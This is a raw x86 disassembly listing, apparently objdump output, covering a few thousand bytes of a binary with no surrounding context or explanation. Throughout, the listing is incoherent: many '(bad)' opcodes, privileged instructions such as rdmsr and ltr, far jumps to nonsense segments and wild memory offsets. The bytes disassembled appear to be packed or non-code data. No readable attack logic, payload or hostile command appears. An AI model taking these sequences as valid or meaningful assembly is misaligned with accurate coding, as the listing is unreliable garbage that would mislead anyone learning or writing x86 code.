  43137b:	lea    ax,[ebp-0x750030]
  431382:	add    al,0x46
  431385:	jmp    0x40ff:0x8885
  43138b:	push   DWORD PTR [ebp+0x52]
  43138e:	lea    eax,[eax]
  431390:	shl    BYTE PTR [esi-0x7b],1
  431393:	test   esi,edi
  431395:	(bad)  
  431396:	(bad)  
  431397:	inc    DWORD PTR [ebp-0x990140]
  43139d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4313a3:	inc    edi
  4313a4:	push   ecx
  4313a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4313ac:	add    al,al
  4313ae:	ret    
  4313af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4313b6:	push   eax
  4313b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4313be:	add    BYTE PTR [ebx-0x764f8839],al
  4313c4:	push   DWORD PTR [esi+0x1]
  4313c7:	inc    DWORD PTR [eax]
  4313c9:	mov    eax,0xff99ff
  4313ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4313d4:	jne    0x43138e
  4313d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  4313e0:	mov    ecx,0xd74fb8
  4313e5:	add    cl,al
  4313e7:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4313ed:	or     DWORD PTR [ebx+0x558966dc],0x7e
  4313f4:	(bad)  
  4313f5:	push   ebp
  4313f7:	mov    eax,0x8c2789
  4313fc:	ret    0x6689
  4313ff:	adc    BYTE PTR [ebp+0x48],0x8d
  431403:	add    bh,ah
  431405:	mov    WORD PTR [ebp-0x70],ax
  431409:	(bad)  
  43140a:	ret    0x667d
  43140d:	or     BYTE PTR [ebp-0x77],dl
  431410:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431417:	loop   0x4313a2
  431419:	(bad)  
  43141a:	xchg   esi,eax
  43141b:	aam    0xcf
  43141d:	out    dx,al
  43141e:	mov    DWORD PTR [esi-0x68],edi
  431421:	inc    ebp
  431422:	dec    edx
  431423:	pop    ecx
  431424:	mov    edx,DWORD PTR [eax]
  431426:	repnz push bp
  431429:	or     BYTE PTR [ebx+0x55106638],0x49
  431430:	(bad)  
  431431:	repnz xor eax,0xa0898945
  431437:	mov    ah,0x89
  431439:	jmp    DWORD PTR [edx+0x66b0418d]
  43143f:	inc    DWORD PTR [ebp+0x50]
  431442:	add    DWORD PTR [ebp-0x5],0xffffffbe
  431446:	mov    DWORD PTR [eax],ecx
  431448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431449:	pop    es
  43144a:	inc    ecx
  43144b:	(bad)  
  43144c:	data16 fwait
  43144e:	inc    ebp
  43144f:	xor    ah,BYTE PTR [esi+0x3]
  431452:	dec    ebp
  431453:	push   eax
  431454:	inc    bp
  431456:	jge    0x4313db
  431458:	mov    esp,DWORD PTR [esi-0x18]
  43145b:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431461:	add    DWORD PTR [ebx],esi
  431463:	add    BYTE PTR [ebx],al
  431465:	test   DWORD PTR [ebx],esi
  431467:	(bad)  
  431468:	inc    WORD PTR [ebp+0x0]
  43146c:	mov    eax,DWORD PTR [eax]
  43146e:	call   0x8898cba3
  431473:	mov    esi,eax
  431475:	clc    
  431476:	ret    
  431477:	rol    cl,0xa
  43147a:	mov    DWORD PTR ds:0x7c0ec88,esi
  431480:	mov    edx,edi
  431482:	pushf  
  431483:	pop    es
  431484:	jmp    FWORD PTR [edx+0x66]
  431487:	add    BYTE PTR [ebp-0x990175],al
  43148d:	inc    ebp
  43148e:	test   DWORD PTR [ebx-0x2f00f202],eax
  431494:	push   ebp
  431495:	mov    edi,eax
  431497:	mov    dh,BYTE PTR [eax+0x266ff51]
  43149d:	push   ebp
  43149e:	add    BYTE PTR [ebx-0x764b0777],al
  4314a4:	dec    DWORD PTR [esi+0x661851e8]
  4314aa:	add    BYTE PTR [ebp-0x7b],dl
  4314ad:	cmp    esi,0xfffffffb
  4314b0:	dec    DWORD PTR [ecx+0x51fe9285]
  4314b6:	jmp    DWORD PTR [esi-0x75]
  4314b9:	push   ebp
  4314ba:	hlt    
  4314bb:	data16 (bad) 
  4314bd:	dec    ebp
  4314be:	ret    
  4314bf:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4314c5:	lea    edx,[eax-0x1]
  4314c8:	jne    0x43149b
  4314ca:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4314d0:	dec    BYTE PTR [ecx+0x51559eff]
  4314d6:	mov    DWORD PTR [esi-0x4c],esp
  4314d9:	push   ebp
  4314da:	jmp    DWORD PTR [esi-0x18]
  4314dd:	inc    ebp
  4314de:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4314e4:	(bad)  
  4314e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4314e6:	inc    eax
  4314e8:	test   DWORD PTR [esi-0x2],esp
  4314eb:	inc    ebp
  4314ec:	dec    DWORD PTR [ebp-0x760bde75]
  4314f2:	(bad)  
  4314f3:	test   al,0xc3
  4314f5:	mov    DWORD PTR [ebp-0x769b56],ecx
  4314fb:	lods   al,BYTE PTR ds:[esi]
  4314fc:	push   eax
  4314fd:	inc    ebp
  4314fe:	jne    0x43150f
  431500:	dec    DWORD PTR [ebp+0x8]
  431503:	mov    ecx,DWORD PTR [ebx]
  431505:	sbb    al,0x0
  431507:	(bad)  
  431508:	mov    eax,0xc14fc3
  43150d:	mov    DWORD PTR [ecx-0xbabf64],ecx
  431513:	movsx  ecx,WORD PTR [ebp+0x4e]
  431517:	xor    eax,DWORD PTR [eax]
  431519:	add    eax,edi
  43151b:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  431521:	xor    edi,DWORD PTR [eax+0x854f66]
  431527:	dec    BYTE PTR [ecx-0x76bb01]
  43152d:	mov    BYTE PTR [ebx-0x76724001],al
  431533:	pushf  
  431534:	inc    esi
  431535:	(bad)  
  431536:	dec    DWORD PTR [ebp-0x7abe6373]
  43153c:	sar    esi,0x89
  43153f:	dec    DWORD PTR [eax+0x0]
  431542:	inc    DWORD PTR [eax]
  431544:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  43154b:	xlat   BYTE PTR ds:[ebx]
  43154c:	dec    edx
  43154d:	add    bh,bh
  43154f:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  431555:	lea    esp,[esi-0x50]
  431558:	(bad)  
  431559:	(bad)  
  43155a:	call   DWORD PTR [eax-0x1]
  43155d:	inc    ebp
  43155e:	rdpmc  
  431560:	add    BYTE PTR [ebx],al
  431562:	push   ax
  431564:	lea    eax,[ebp-0x1]
  43156a:	js     0x43156b
  43156c:	add    al,bh
  43156e:	push   bp
  431570:	lea    ecx,[ebp-0x7701]
  431576:	fmul   DWORD PTR [ebp-0x7a997800]
  43157c:	(bad)  
  43157d:	(bad)  
  43157e:	(bad)  
  43157f:	(bad)  
  431580:	jmp    DWORD PTR [ecx-0x7676ffb3]
  431586:	dec    eax
  431587:	mov    eax,0x8d8dffff
  43158c:	mov    al,0xb0
  43158e:	(bad)  
  43158f:	call   DWORD PTR [ecx+0x50]
  431592:	dec    ebp
  431593:	inc    ebp
  431594:	mov    esi,0x7030833
  431599:	push   eax
  43159a:	into   
  43159b:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  4315a1:	call   DWORD PTR [ecx-0x8]
  4315a4:	lea    edx,[ebp-0x1]
  4315a7:	jmp    0x7617ab
  4315ac:	inc    eax
  4315ad:	jnp    0x43153c
  4315af:	add    dh,bh
  4315b1:	inc    WORD PTR [ebp-0x8a00b0]
  4315b8:	mov    edx,eax
  4315ba:	inc    esp
  4315bb:	add    bh,bh
  4315bd:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  4315c3:	dec    DWORD PTR [ebx-0x7f820301]
  4315c9:	add    BYTE PTR [ecx],al
  4315cb:	data16 add BYTE PTR [ebp-0xb30077],al
  4315d2:	inc    eax
  4315d4:	(bad)  
  4315d5:	dec    si
  4315d7:	test   edi,edi
  4315d9:	(bad)  
  4315da:	cmp    edi,edi
  4315dc:	add    ecx,DWORD PTR [edi-0x39]
  4315df:	mov    edx,DWORD PTR [edx+0x66]
  4315e2:	inc    DWORD PTR [ebp-0x3d00cb]
  4315e8:	mov    eax,0x66ff8b5e
  4315ee:	jmp    0xb4ff:0xc7ff3895
  4315f5:	push   ecx
  4315f6:	inc    DWORD PTR [ebx-0x76ffccbb]
  4315fc:	call   DWORD PTR [esi-0x1]
  4315ff:	dec    DWORD PTR [eax]
  431601:	mov    ecx,0x805ff
  431606:	inc    ebp
  431607:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  43160d:	mov    ecx,0x35784
  431612:	add    BYTE PTR [ecx-0xffa59b],cl
  431618:	inc    ebp
  431619:	mov    ecx,0x9c6131
  43161e:	(bad)  
  43161f:	mov    eax,ebx
  431621:	pop    esp
  431622:	test   edi,edi
  431624:	clc    
  431625:	lea    eax,[ebp-0x24]
  431628:	cmp    eax,0xc7fe9c8d
  43162d:	push   eax
  43162f:	lea    eax,[ebp+0x45fff8fe]
  431635:	mov    esi,DWORD PTR [ecx]
  431637:	hlt    
  431638:	lahf   
  431639:	push   esp
  43163a:	mov    edx,DWORD PTR [ecx-0x4]
  43163d:	xor    eax,DWORD PTR [eax+0x7201bb]
  431643:	add    BYTE PTR [ebp-0x35],al
  431646:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  43164c:	mov    edx,DWORD PTR [ecx-0x74]
  43164f:	rol    BYTE PTR [eax],0x8d
  431652:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  431656:	nop
  431657:	push   ecx
  431658:	add    bh,bh
  43165a:	mov    esp,edi
  43165c:	in     al,0x85
  43165e:	jge    0x43165e
  431660:	test   edi,edi
  431662:	jne    0x4315e9
  431664:	(bad)  
  431665:	(bad)  
  431666:	sbb    bh,bh
  431668:	push   ebp
  431669:	inc    ebp
  43166a:	call   0xffdc10fa
  43166f:	add    BYTE PTR [ebp+0x66],al
  431672:	mov    edx,DWORD PTR [ebp-0xfc0075]
  431678:	cmp    al,0x85
  43167a:	ud0    eax,DWORD PTR [ebp-0x1]
  43167e:	test   DWORD PTR [edi+0x74],ecx
  431681:	dec    edi
  431682:	inc    DWORD PTR [ebp-0x50004]
  431688:	dec    DWORD PTR [edi-0x75]
  43168b:	dec    esi
  43168c:	cld    
  43168d:	test   DWORD PTR [eax+0xff01ff],eax
  431693:	icebp  
  431694:	add    BYTE PTR [edi-0x3a],cl
  431697:	test   ebx,eax
  431699:	inc    BYTE PTR [ebp-0x1]
  43169c:	jne    0x43169e
  43169e:	mov    eax,DWORD PTR [eax]
  4316a0:	cld    
  4316a1:	xor    BYTE PTR [ecx+0x500155],cl
  4316a7:	push   ebp
  4316a8:	xor    DWORD PTR [ecx+0x45011c80],ecx
  4316ae:	add    BYTE PTR [ebp+0x35e90f50],al
  4316b4:	add    al,BYTE PTR [eax]
  4316b6:	add    BYTE PTR [ebx-0x38fe4f80],al
  4316bc:	add    ah,ch
  4316be:	or     BYTE PTR [ebp+0x4501f845],dh
  4316c4:	jmp    0xdf19ba
  4316c9:	(bad)  
  4316ca:	nop    ecx
  4316cd:	test   DWORD PTR [ebp+0x4502f8],eax
  4316d3:	xor    ecx,DWORD PTR [ebp-0x64]
  4316d6:	mov    eax,edi
  4316d8:	mov    ebx,DWORD PTR [eax+edx*2]
  4316db:	add    eax,0x45fef885
  4316e0:	dec    DWORD PTR [ebx+0x339445]
  4316e6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4316ec:	dec    DWORD PTR [ebx-0x460f0375]
  4316f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4316f3:	add    esi,edi
  4316f5:	add    bh,bh
  4316f7:	rdpmc  
  4316f9:	add    BYTE PTR [ebx],0x1
  4316fc:	mov    DWORD PTR [eax],eax
  4316fe:	add    al,0x45
  431700:	dec    DWORD PTR [ecx-0x360b3373]
  431706:	dec    DWORD PTR [esi]
  431708:	push   eax
  431709:	jne    0x431750
  43170b:	mov    esi,DWORD PTR [ebx]
  43170d:	cld    
  43170e:	add    esp,ecx
  431710:	push   eax
  431711:	inc    DWORD PTR [ebp-0x75]
  431714:	add    eax,0x800e4
  431719:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43171f:	mov    DWORD PTR [ecx],eax
  431721:	sbb    al,0x0
  431723:	leave  
  431724:	test   DWORD PTR [edi-0x2],eax
  431727:	jne    0x431728
  431729:	call   0xff44012e
  43172e:	xor    BYTE PTR [ebp+0x4d],al
  431731:	mov    edi,edi
  431733:	enter  0x8,0x4d
  431737:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43173d:	mov    eax,DWORD PTR [eax]
  43173f:	cld    
  431740:	add    DWORD PTR [ecx],ebx
  431742:	inc    ebp
  431743:	dec    ebp
  431744:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43174a:	inc    eax
  43174b:	dec    DWORD PTR [ecx-0x270375]
  431751:	add    BYTE PTR [ebx-0x39d72701],cl
  431757:	xchg   ecx,eax
  431758:	ret    
  431759:	add    BYTE PTR [ebp-0x830075],al
  43175f:	add    BYTE PTR [ebp-0x75],al
  431762:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  431768:	lea    edi,[edi-0xc]
  43176b:	add    bh,bh
  43176d:	mov    edx,DWORD PTR [eax-0x7b]
  431770:	inc    ebp
  431771:	rdpmc  
  431773:	jne    0x431778
  431775:	add    BYTE PTR [eax-0x75],dl
  431778:	inc    ebp
  431779:	clc    
  43177a:	add    eax,0x400009
  43177f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  431785:	mov    eax,DWORD PTR [ecx]
  431787:	in     al,dx
  431788:	add    dh,al
  43178a:	test   ebx,eax
  43178c:	inc    BYTE PTR [ebp-0xff0001]
  431792:	add    BYTE PTR [ebp-0x43],al
  431795:	cmp    esi,0xfffffff8
  431798:	(bad)  
  431799:	push   DWORD PTR [eax]
  43179b:	add    BYTE PTR [ebp-0x3a],dl
  43179e:	test   ebx,eax
  4317a0:	je     0x431727
  4317a2:	mov    edi,edi
  4317a4:	sbb    al,0xff
  4317a6:	test   DWORD PTR gs:[eax],eax
  4317a9:	(bad)  
  4317aa:	js     0x4317ab
  4317ac:	add    BYTE PTR [ebx-0x39b20bdd],cl
  4317b2:	sub    eax,ebx
  4317b4:	mov    ecx,DWORD PTR [ebx-0x55130377]
  4317ba:	add    eax,DWORD PTR [eax]
  4317bc:	dec    ebp
  4317bd:	push   eax
  4317be:	mov    al,BYTE PTR [ebp+0x1]
  4317c1:	mov    eax,DWORD PTR [ebp-0x68]
  4317c4:	mov    eax,DWORD PTR [eax]
  4317c6:	sbb    bh,al
  4317c8:	or     ah,dh
  4317ca:	dec    ebp
  4317cb:	inc    DWORD PTR [eax+0x4]
  4317ce:	push   ecx
  4317cf:	add    BYTE PTR [edx-0x1],dh
  4317d2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4317d8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4317e2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4317e8:	push   ecx
  4317e9:	cmp    BYTE PTR [ebx],al
  4317eb:	inc    ebp
  4317ec:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4317f2:	(bad)  
  4317f3:	(bad)  
  4317f4:	in     al,0xff
  4317f6:	add    BYTE PTR [ebp+0x0],al
  4317f9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4317ff:	add    al,bh
  431801:	(bad)  
  431802:	jmp    0x8d85:0x74b0558d
  431809:	dec    DWORD PTR [eax]
  43180b:	call   DWORD PTR [ebp-0x7b]
  43180e:	mov    edi,esi
  431810:	lock call DWORD PTR [ebp-0x75]
  431814:	mov    esi,esp
  431816:	mov    ah,0xc6
  431818:	mov    bh,0xc3
  43181a:	mov    DWORD PTR [ebx-0x110003c4],ecx
  431820:	add    DWORD PTR [eax],0x450050ff
  431826:	mov    DWORD PTR [ebx+0x9598cc],ecx
  43182c:	inc    edi
  43182e:	push   esp
  431830:	jmp    0xcd00:0x650481ff
  431837:	mov    DWORD PTR [ebx],esi
  431839:	clc    
  43183a:	cmp    edi,0xff9cff3c
  431840:	jne    0x43184a
  431842:	mov    eax,eax
  431844:	add    esi,DWORD PTR [eax]
  431846:	int3   
  431847:	inc    ebp
  431848:	cmp    al,0x83
  43184a:	add    BYTE PTR [eax],bl
  43184c:	adc    DWORD PTR [ebx+0x768b5055],eax
  431852:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  431858:	mov    edi,eax
  43185a:	cmp    BYTE PTR [ebp+0x45],cl
  43185d:	jmp    0x4317ea
  43185f:	mov    ebx,DWORD PTR [esp+ebp*8]
  431862:	inc    ebp
  431863:	or     al,0x2
  431865:	dec    DWORD PTR [ebp+0x18]
  431868:	jne    0x4318bf
  43186a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  431870:	mov    edi,DWORD PTR [ebx]
  431872:	in     al,0x50
  431874:	xchg   ecx,eax
  431875:	jmp    0x343677a
  43187a:	adc    al,0x8b
  43187c:	inc    ebp
  43187d:	mov    al,ds:0x8b04008b
  431882:	push   ebp
  431883:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  431889:	push   ebp
  43188a:	test   DWORD PTR [ebx-0x2800d701],ecx
  431890:	inc    ebp
  431891:	dec    ebp
  431892:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431898:	mov    DWORD PTR [eax],0xe9ff00f4
  43189e:	add    al,0x0
  4318a0:	add    BYTE PTR [eax],al
  4318a2:	mov    eax,edx
  4318a4:	push   eax
  4318a5:	rol    DWORD PTR [ebp-0xf0177],1
  4318ab:	bound  eax,QWORD PTR [ebp+0x50]
  4318ae:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  4318b4:	add    BYTE PTR [ecx+0x558df0ff],cl
  4318ba:	mov    al,0xf
  4318bc:	test   DWORD PTR [edx],edx
  4318be:	call   DWORD PTR [ebp-0x7a0001]
  4318c4:	(bad)  
  4318c5:	loop   0x4318c6
  4318c7:	jnp    0xc6990ccd
  4318cd:	mov    eax,ebx
  4318cf:	cmp    al,0x8b
  4318d1:	(bad)  
  4318d2:	cld    
  4318d3:	shr    esi,0xc
  4318d6:	add    dl,al
  4318d8:	push   eax
  4318d9:	lea    eax,[ebp-0x1]
  4318dc:	mov    edx,esi
  4318de:	cwde   
  4318df:	cli    
  4318e0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4318e6:	or     BYTE PTR [eax],cl
  4318e8:	inc    ebp
  4318e9:	dec    ebp
  4318ea:	inc    DWORD PTR [ebx+0x74803914]
  4318f0:	add    DWORD PTR [ebx+0x451800],ecx
  4318f6:	call   DWORD PTR [eax+edx*1]
  4318f9:	add    ecx,DWORD PTR [ebp-0x34]
  4318fc:	push   edi
  4318fd:	adc    al,0x8
  4318ff:	mov    edx,DWORD PTR [ebp-0x14]
  431902:	mov    ecx,DWORD PTR [ebp+0x18]
  431905:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431909:	inc    DWORD PTR [eax+esi*8]
  43190c:	inc    ebp
  43190d:	stos   BYTE PTR es:[edi],al
  43190e:	mov    edx,DWORD PTR [ebp-0x4]
  431911:	add    DWORD PTR [ebp-0x1c],eax
  431914:	mov    edx,DWORD PTR [ebp-0x70]
  431917:	cmp    eax,DWORD PTR [eax]
  431919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43191a:	mov    eax,DWORD PTR [eax]
  43191c:	cld    
  43191d:	jae    0x43189f
  43191f:	add    eax,DWORD PTR [ecx]
  431921:	clc    
  431922:	add    BYTE PTR [eax+0x30],dl
  431925:	mov    DWORD PTR [ecx],esi
  431927:	clc    
  431928:	pop    ds
  431929:	inc    ebp
  43192a:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  431930:	(bad)  
  431931:	push   DWORD PTR [edi]
  431933:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  431939:	(bad)  
  43193a:	jae    0x43193b
  43193c:	mov    eax,DWORD PTR [ebp-0x740175]
  431942:	sub    eax,DWORD PTR [eax]
  431944:	add    eax,DWORD PTR [eax]
  431946:	mov    DWORD PTR [ecx+0x5f],eax
  431949:	mov    DWORD PTR [ebx-0x4],ebx
  43194c:	ret    0xff
  43194f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  431955:	ret    
  431956:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43195c:	add    BYTE PTR [ebp-0x7d],al
  43195f:	mov    DWORD PTR [eax],eax
  431961:	add    al,0x84
  431963:	inc    DWORD PTR [ecx]
  431965:	lea    eax,[eax]
  431967:	hlt    
  431968:	sar    bh,cl
  43196a:	test   BYTE PTR [eax+0x1],dl
  43196d:	inc    ebp
  43196e:	add    BYTE PTR [ebx],dh
  431970:	test   BYTE PTR [ebx],0x84
  431973:	push   eax
  431974:	add    BYTE PTR [ebp+0x0],al
  431977:	add    eax,0x86
  43197c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  431982:	add    BYTE PTR [ecx],al
  431984:	add    BYTE PTR [eax],al
  431986:	mov    esi,0x550030
  43198b:	mov    ecx,DWORD PTR [edi]
  43198d:	cld    
  43198e:	fidiv  DWORD PTR [ebp+0x0]
  431991:	mov    edi,DWORD PTR [ecx]
  431993:	xor    BYTE PTR [eax+eax*1],0x84
  431997:	add    eax,DWORD PTR [eax]
  431999:	sbb    BYTE PTR [eax],al
  43199b:	jne    0x43194e
  43199d:	mov    eax,DWORD PTR [ecx]
  43199f:	sbb    BYTE PTR [eax],al
  4319a1:	mov    DWORD PTR [ebp-0x1],esp
  4319a4:	add    BYTE PTR [eax+0x30e45ca],bh
  4319aa:	ret    0xb7fc
  4319ad:	dec    ebp
  4319ae:	or     al,0x89
  4319b0:	dec    ebp
  4319b1:	cld    
  4319b2:	cmovne ecx,DWORD PTR [eax-0x75]
  4319b6:	add    edi,esp
  4319b8:	seto   BYTE PTR [esi-0x72ffffff]
  4319bf:	inc    ebp
  4319c0:	adc    al,0x8b
  4319c2:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  4319c9:	cmp    DWORD PTR [edi+0x72],edx
  4319cc:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4319d2:	gs cmp al,0x0
  4319d5:	je     0x4319ad
  4319d7:	push   eax
  4319d8:	sar    BYTE PTR [eax],1
  4319da:	mov    bh,0x3e
  4319dc:	push   cs
  4319dd:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4319e3:	add    DWORD PTR [ecx+0x12],ebp
  4319e6:	dec    edx
  4319e7:	(bad)  
  4319e8:	mov    eax,edx
  4319ea:	in     al,dx
  4319eb:	adc    DWORD PTR [ecx],esi
  4319ed:	pop    esi
  4319ee:	inc    ecx
  4319ef:	leave  
  4319f0:	or     DWORD PTR [eax],ebx
  4319f2:	gs push ebp
  4319f4:	add    ah,ch
  4319f6:	into   
  4319f7:	in     al,dx
  4319f8:	enter  0xb756,0xf0
  4319fc:	push   cs
  4319fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a07:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a0d:	jnp    0x74439f15
  431a13:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a19:	add    BYTE PTR [edi],cl
  431a1b:	mov    edi,DWORD PTR [ecx-0x78]
  431a1e:	ltr    WORD PTR [ecx-0x7b]
  431a22:	dec    DWORD PTR [edi]
  431a24:	clc    
  431a25:	out    0x45,eax
  431a27:	add    BYTE PTR [eax],cl
  431a29:	cmp    ebx,0xffffff8c
  431a2c:	jge    0x431a2e
  431a2e:	jb     0x431a40
  431a30:	je     0x521ab0
  431a36:	pop    edx
  431a37:	push   esi
  431a38:	mov    ecx,DWORD PTR [edi]
  431a3a:	in     al,dx
  431a3b:	rol    DWORD PTR [ebp+0x0],1
  431a3e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a45:	cmp    DWORD PTR [ecx],0xfffffff0
  431a48:	hlt    
  431a49:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a4f:	(bad)  
  431a51:	push   eax
  431a52:	jns    0xb842fed0
  431a58:	lock push cs
  431a5a:	ror    edx,0x3
  431a5d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a63:	dec    eax
  431a64:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a68:	(bad)  
  431a69:	mov    esi,0x7f33ff5f
  431a6e:	inc    eax
  431a6f:	test   DWORD PTR [edx],eax
  431a71:	je     0x431a33
  431a73:	mov    ecx,ecx
  431a75:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a79:	and    eax,DWORD PTR [eax+0xf0103]
  431a7f:	jp     0x431a6d
  431a81:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a85:	add    edx,DWORD PTR [edi+0x74]
  431a88:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a8e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a94:	je     0x431a19
  431a96:	cmp    eax,edi
  431a98:	js     0x431abd
  431a9a:	add    eax,0xeb0fc003
  431a9f:	jns    0x431a2c
  431aa1:	vmread DWORD PTR [ecx+0x45],ebx
  431aa5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431aab:	adc    al,0x8b
  431aad:	jge    0x431ac3
  431aaf:	mov    edi,DWORD PTR [eax-0x4]
  431ab2:	add    edi,DWORD PTR [edi]
  431ab4:	or     bh,bh
  431ab6:	push   ebp
  431ab7:	push   es
  431ab8:	mov    DWORD PTR [ebp-0x4],ebx
  431abb:	add    edi,esi
  431abd:	pop    es
  431abe:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ac4:	mov    DWORD PTR [esp+esi*8],ecx
  431ac7:	inc    ebp
  431ac8:	pop    ebp
  431ac9:	xor    DWORD PTR [esi-0x4],0x3b
  431acd:	add    edx,DWORD PTR [ecx+edi*1]
  431ad0:	push   es
  431ad1:	clc    
  431ad2:	mov    bh,0xdb
  431ad4:	jp     0x431a8d
  431ad6:	add    cl,BYTE PTR [esi]
  431ad8:	div    DWORD PTR [edi+0x4d8b0c1c]
  431ade:	test   edi,edi
  431ae0:	je     0x431ad6
  431ae2:	mov    eax,ecx
  431ae4:	or     BYTE PTR [ebx],al
  431ae6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431aec:	jbe    0x431b60
  431aee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431af4:	add    ecx,DWORD PTR [esi]
  431af6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431afc:	add    eax,DWORD PTR [ebx-0x287af783]
  431b02:	je     0x431b51
  431b04:	mov    DWORD PTR [ecx],edi
  431b06:	mov    esi,eax
  431b08:	hlt    
  431b09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b10:	jb     0x431ad2
  431b12:	jmp    0x431aff
  431b14:	xor    esi,DWORD PTR [ebx]
  431b16:	pop    edi
  431b17:	pop    esi
  431b18:	pop    ebx
  431b19:	ret    
  431b1a:	ret    0x8b
  431b1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b23:	xor    DWORD PTR [ecx],0xc
  431b26:	pushf  
  431b27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b2d:	rdmsr  
  431b2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b36:	dec    ebp
  431b37:	ret    
  431b38:	mov    edi,DWORD PTR [esi-0x4]
  431b3b:	pop    eax
  431b3c:	dec    ebp
  431b3d:	jne    0x431aca
  431b3f:	xor    edi,esp
  431b41:	inc    eax
  431b42:	dec    ebp
  431b43:	jbe    0x431b98
  431b45:	inc    eax
  431b46:	pop    ebp
  431b47:	add    edx,DWORD PTR [esi+0x8]
  431b4a:	push   esp
  431b4b:	dec    eax
  431b4c:	push   ecx
  431b4d:	mov    eax,edi
  431b4f:	and    al,0xf0
  431b51:	jo     0x431b3e
  431b53:	mov    eax,DWORD PTR [ebx]
  431b55:	sbb    BYTE PTR [ebp+0x4d],cl
  431b58:	mov    eax,DWORD PTR [ebx]
  431b5a:	nop
  431b5b:	or     BYTE PTR [eax],al
  431b5d:	jne    0x431bb6
  431b5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b65:	cld    
  431b66:	xor    edi,edi
  431b68:	add    edi,DWORD PTR [ebp+0x3]
  431b6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b71:	js     0x431af7
  431b73:	jae    0x431b77
  431b75:	(bad)  
  431b77:	xor    al,0x5d
  431b79:	jmp    0x431b06
  431b7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b82:	fdecstp 
  431b84:	test   BYTE PTR [edi],ah
  431b86:	add    bh,BYTE PTR [ebp+0x0]
  431b89:	add    ebx,DWORD PTR [ebp-0x77]
  431b8c:	mov    edi,eax
  431b8e:	cmp    al,0x0
  431b91:	adc    dh,BYTE PTR [ebx]
  431b93:	jge    0x431b98
  431b95:	mov    edi,DWORD PTR [ebx]
  431b97:	jl     0x431ba8
  431b99:	clc    
  431b9a:	dec    edi
  431b9b:	jge    0x431b9d
  431b9d:	mov    eax,DWORD PTR [ebx]
  431b9f:	jb     0x431ba9
  431ba1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ba4:	mov    edi,edi
  431ba6:	xor    edx,DWORD PTR [eax]
  431ba8:	add    edi,DWORD PTR [ebx]
  431baa:	mov    DWORD PTR [ebp-0x10],edi
  431bad:	inc    edi
  431bae:	pop    ebp
  431baf:	jge    0x431bec
  431bb1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431bb5:	mov    edx,0xc05d87f0
